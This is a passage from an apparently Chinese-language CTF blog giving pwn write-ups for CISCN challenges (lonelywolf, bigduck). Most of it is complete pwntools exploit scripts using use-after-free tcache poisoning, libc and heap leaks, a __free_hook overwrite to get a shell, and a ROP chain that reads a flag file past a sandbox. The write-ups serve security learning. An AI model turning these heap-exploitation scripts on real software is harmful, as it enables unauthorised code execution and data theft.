rop_open+rop_read+rop_write</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x58</span>) <span class="comment">#布置rop链</span></span><br><span class="line">edit(<span class="number">0</span>,payload[:<span class="number">0x58</span>])</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x78</span>) <span class="comment">#布置rop链</span></span><br><span class="line">edit(<span class="number">0</span>,payload[<span class="number">0x58</span>:])</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x48</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *&#x27;+str(heap_addr+0x2000))</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">io.recv()</span><br></pre></td></tr></table></figure><h2 id="CISCN-2021-初赛-lonelywolf"><a href="#CISCN-2021-初赛-lonelywolf" class="headerlink" title="[CISCN 2021 初赛]lonelywolf"></a>[CISCN 2021 初赛]lonelywolf</h2><p>比上面那一题更加简单 因为没有了沙盒限制 手法一模一样 就直接放exp了 唯一的麻烦是打不通远程 因为远程是2.27 1.4的版本 搞不到</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;1.14.71.254&quot;,28793)</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">libc = ELF(<span class="string">&quot;./glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc-2.27.so&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./刷题/libc-2.27.so&quot;)</span></span><br><span class="line"><span class="comment"># context.arch = &quot;i386&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x70</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">heap_addr = u64(io.recvuntil(<span class="string">&quot;\x0a&quot;</span>,drop = <span class="literal">True</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x260</span></span><br><span class="line">success(<span class="string">&quot;heap_addr :&quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">edit(<span class="number">0</span>,p64(heap_addr+<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x70</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x70</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x7000000</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">main_arena_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;main_arena_addr :&quot;</span>+<span class="built_in">hex</span>(main_arena_addr))</span><br><span class="line">libc_addr = main_arena_addr - (<span class="number">0x7f85379ebca0</span>-<span class="number">0x7f8537600000</span>)</span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">free_hook = libc_addr + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x60</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">8</span>+p64(free_hook)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(system_addr))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="CISCN-2022-华东北-bigduck"><a href="#CISCN-2022-华东北-bigduck" class="headerlink" title="[CISCN 2022 华东北]bigduck"></a>[CISCN 2022 华东北]bigduck</h2><p>通过这题学到了很多新东西 先来看一下保护机制吧</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303191559236.png" title="image-20230319155923093" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303191559236.png" alt="image-20230319155923093"></a></p><p>这一道题是libc2.33的环境 并且开启了沙盒</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303191600618.png" title="image-20230319160007547" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303191600618.png" alt="image-20230319160007547"></a></p><p>接着ida分析一下程序</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  init_sandbox();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu(a1, a2);</span><br><span class="line">      v3 = ((&amp;sub_1268 + <span class="number">1</span>))();</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">4</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      edit();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_13:</span><br><span class="line">      a1 = <span class="string">&quot;Invalid choice&quot;</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      show();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 &gt; <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        add();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">        delete();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>标准的菜单题 函数给的挺全 没有堆溢出 但是有UAF 值得注意的是 add函数只能申请0x100大小的chunk</p><p>既然给了打印堆块内容的机会 那么这里想的是通过unsortebin来泄露libc基址 不过由于只能申请0x100的chunk 那就通过填满tcache链表的办法</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add()</span><br><span class="line"></span><br><span class="line">add()<span class="comment">#7</span></span><br><span class="line">add()<span class="comment">#8</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)</span><br></pre></td></tr></table></figure><p>成功将chunk7释放进unsortedbin</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303191604561.png" title="image-20230319160404499" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303191604561.png" alt="image-20230319160404499"></a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">edit(<span class="number">7</span>,<span class="number">1</span>,<span class="string">b&#x27;\x01&#x27;</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">io.recv()</span><br><span class="line">main_arena_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1</span>-<span class="number">96</span></span><br><span class="line">success(<span class="string">&quot;main_arena_addr :&quot;</span>+<span class="built_in">hex</span>(main_arena_addr))</span><br><span class="line">libc_addr = main_arena_addr - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x10</span></span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">edit(<span class="number">7</span>,<span class="number">1</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br></pre></td></tr></table></figure><p>接下来就是把main_arena_addr打印出来了 唯一一点需要注意的就是该libc版本main_arena_addr + 96末位是\x00 所以printf函数无法将其打印出来 需要我们修改一下末尾的值 最后再减去</p><p>接下来 由于高版本多了一个tcache链表的fd异或保护机制 所以还需要泄露堆基址 这个也比较简单 直接打印处链表尾的chunk0就好了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recv()</span><br><span class="line">key = u64(io.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;key :&quot;</span>+<span class="built_in">hex</span>(key))</span><br><span class="line">heap_addr = key &lt;&lt; <span class="number">12</span></span><br><span class="line">success(<span class="string">&quot;heap_addr :&quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br></pre></td></tr></table></figure><p>接下来 我们就需要想办法获取flag了 由于开启了沙盒 所以没有办法通过简单的通过hook函数来获取shell</p><p>之前的题目做过通过setcontext来劫持rsp指针 迁移到我们在堆上布置的rop链 不过由于2.33 其从rdi寻址改成了rcx寻址 给利用带来了不少难度 所以这里只能作废了</p><p>这里使用我们做栈题的老办法了 覆盖ret addr</p><p>那么获取到栈地址是一个关键的问题 这里可以使用environ指针</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303191615015.png" title="image-20230319161518940" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303191615015.png" alt="image-20230319161518940"></a></p><p>我们跟进一下其存储的栈地址</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303191618185.png" title="image-20230319161804065" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303191618185.png" alt="image-20230319161804065"></a></p><p>可以看到低地址处是一个栈帧 我们可以覆盖这个栈帧的ret addr</p><p>至于这个是谁的栈帧呢 我编写了一个小程序来动调查验</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">test1</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;test1&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test2</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;test2&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  test1();</span><br><span class="line">  test2();</span><br><span class="line">  test1();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过测试 不论是跟进到test函数中 还是在main函数中 environ索引到的都是栈帧高地址处的一块内存</p><p>覆盖的ret addr实际上是使得任何函数的返回地址都为止修改(待考证 目前可以确定的是哪怕read函数的返回地址也是受到这个影响的 等我有空更深入了解一下堆栈结构吧 感觉这方面的理解还是不清楚)</p><p>经过计算 我们得到了ret addr的地址 接下里只要利用tcachebin attack任意写修改其值就可以了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    add()  <span class="comment">#9-13</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">8</span>,p64(environ_addr ^ key))</span><br><span class="line">add()<span class="comment">#14</span></span><br><span class="line">add()<span class="comment">#15</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">8</span>,<span class="string">b&#x27;./flag\x00\x00&#x27;</span>)</span><br><span class="line">show(<span class="number">15</span>)</span><br><span class="line">io.recv()</span><br><span class="line">stack_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x138</span></span><br><span class="line">success(<span class="string">&quot;stack_addr :&quot;</span>+<span class="built_in">hex</span>(stack_addr))</span><br></pre></td></tr></table></figure><p>我们先将tcache清空一下 取出大部分chunk 就留下两个留着攻击</p><p>随后申请到environ处 利用show函数打印处栈地址</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">edit(<span class="number">10</span>,<span class="number">8</span>,p64(stack_addr^key))</span><br><span class="line">add()<span class="comment">#16</span></span><br><span class="line">add()<span class="comment">#17</span></span><br><span class="line">rdi_addr = libc_addr + libc.search(asm(<span class="string">&#x27;pop rdi;ret;&#x27;</span>)).__next__()</span><br><span class="line">rsi_addr = libc_addr + libc.search(asm(<span class="string">&#x27;pop rsi;ret;&#x27;</span>)).__next__()</span><br><span class="line">rdx_addr = libc_addr + <span class="number">0x00000000000c7f32</span></span><br><span class="line"><span class="comment"># rax_addr = libc_addr + 0x0000000000044c70</span></span><br><span class="line"><span class="comment"># syscall = libc_addr + 0x0000000000026858</span></span><br><span class="line">open_addr = libc_addr + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr = libc_addr + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr = libc_addr + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="comment">#open</span></span><br><span class="line"><span class="comment">#flag_addr = stack_addr +0x10</span></span><br><span class="line">flag_addr = heap_addr + <span class="number">0x2a0</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(rdi_addr) + p64(flag_addr) + p64(rsi_addr) + p64(<span class="number">0</span>) + p64(open_addr)</span><br><span class="line">payload += p64(rdi_addr) + p64(<span class="number">3</span>) + p64(rsi_addr) + p64(flag_addr) + p64(rdx_addr) + p64(<span class="number">0x50</span>) + p64(read_addr)</span><br><span class="line">payload += p64(rdi_addr) + p64(<span class="number">1</span>) + p64(rsi_addr) + p64(flag_addr) + p64(rdx_addr) + p64(<span class="number">0x50</span>) + p64(write_addr)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *&#x27;+str(rdi_addr))</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *$rebase(0x14AD)&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">edit(<span class="number">17</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.recv()</span><br><span class="line">debug()</span><br></pre></td></tr></table></figure><p>接下来任意写到ret addr不远处 这里准确的应该是stack_addr - 0x128 但是好像不能直接申请到这里 估计是malloc检查之类的锅 有待考究 至于申请到stack_addr - 0x138的话 覆盖到了canary 但是不会触发报错 是因为压根没检查 可能是出题人通过什么办法去掉了吧</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303191646434.png" title="image-20230319164627276" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303191646434.png" alt="image-20230319164627276"></a></p><p>完整exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;1.14.71.254&quot;,28793)</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/chen/glibc-all-in-one/libs/2.33-0ubuntu5_amd64/libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./刷题/libc-2.27.so&quot;)</span></span><br><span class="line"><span class="comment"># context.arch = &quot;i386&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Done&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Idx: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Idx: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Idx: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add()</span><br><span class="line"></span><br><span class="line">add()<span class="comment">#7</span></span><br><span class="line">add()<span class="comment">#8</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">edit(<span class="number">7</span>,<span class="number">1</span>,<span class="string">b&#x27;\x01&#x27;</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">io.recv()</span><br><span class="line">main_arena_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1</span>-<span class="number">96</span></span><br><span class="line">success(<span class="string">&quot;main_arena_addr :&quot;</span>+<span class="built_in">hex</span>(main_arena_addr))</span><br><span class="line">libc_addr = main_arena_addr - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x10</span></span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">edit(<span class="number">7</span>,<span class="number">1</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recv()</span><br><span class="line">key = u64(io.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;key :&quot;</span>+<span class="built_in">hex</span>(key))</span><br><span class="line">heap_addr = key &lt;&lt; <span class="number">12</span></span><br><span class="line">success(<span class="string">&quot;heap_addr :&quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">environ_addr = libc_addr + libc.sym[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    add()  <span class="comment">#9-13</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">8</span>,p64(environ_addr ^ key))</span><br><span class="line">add()<span class="comment">#14</span></span><br><span class="line">add()<span class="comment">#15</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">8</span>,<span class="string">b&#x27;./flag\x00\x00&#x27;</span>)</span><br><span class="line">show(<span class="number">15</span>)</span><br><span class="line">io.recv()</span><br><span class="line">stack_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x138</span></span><br><span class="line">success(<span class="string">&quot;stack_addr :&quot;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">edit(<span class="number">10</span>,<span class="number">8</span>,p64(stack_addr^key))</span><br><span class="line">add()<span class="comment">#16</span></span><br><span class="line">add()<span class="comment">#17</span></span><br><span class="line">rdi_addr = libc_addr + libc.search(asm(<span class="string">&#x27;pop rdi;ret;&#x27;</span>)).__next__()</span><br><span class="line">rsi_addr = libc_addr + libc.search(asm(<span class="string">&#x27;pop rsi;ret;&#x27;</span>)).__next__()</span><br><span class="line">rdx_addr = libc_addr + <span class="number">0x00000000000c7f32</span></span><br><span class="line"><span class="comment"># rax_addr = libc_addr + 0x0000000000044c70</span></span><br><span class="line"><span class="comment"># syscall = libc_addr + 0x0000000000026858</span></span><br><span class="line">open_addr = libc_addr + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr = libc_addr + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr = libc_addr + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="comment">#open</span></span><br><span class="line"><span class="comment">#flag_addr = stack_addr +0x10</span></span><br><span class="line">flag_addr = heap_addr + <span class="number">0x2a0</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(rdi_addr) + p64(flag_addr) + p64(rsi_addr) + p64(<span class="number">0</span>) + p64(open_addr)</span><br><span class="line">payload += p64(rdi_addr) + p64(<span class="number">3</span>) + p64(rsi_addr) + p64(flag_addr) + p64(rdx_addr) + p64(<span class="number">0x50</span>) + p64(read_addr)</span><br><span class="line">payload += p64(rdi_addr) + p64(<span class="number">1</span>) + p64(rsi_addr) + p64(flag_addr) + p64(rdx_addr) + p64(<span class="number">0x50</span>) + p64(write_addr)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *&#x27;+str(rdi_addr))</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *$rebase(0x14AD)&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">edit(<span class="number">17</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.recv()</span><br><span class="line">debug()</span><br></pre></td></tr></table></figure><p>另外关于最后的劫持程序执行流 还有一种办法 我们之前不是提到过 可以确定的是read函数的栈帧也是在那一块吗 可以劫持read函数执行完后的程序执行流 并且由于我们没有破坏原本的栈结构 所以程序执行完 还是可以正常返回的</p><p>我们将任意写的地址改为stack_addr - 0x168 然后s到read函数中的syscall来看一看</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303191650603.png" title="image-20230319165046509" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303191650603.png" alt="image-20230319165046509"></a></p><p>可以看到 如果我们在rop链前添上8字节的垃圾数据的话 在执行完read后 rsp指针指向的刚好就是rop链的首地址 这时候执行ret指令 就劫持了程序执行流</p><p>另外一种exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;1.14.71.254&quot;,28793)</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/chen/glibc-all-in-one/libs/2.33-0ubuntu5_amd64/libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./刷题/libc-2.27.so&quot;)</span></span><br><span class="line"><span class="comment"># context.arch = &quot;i386&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span 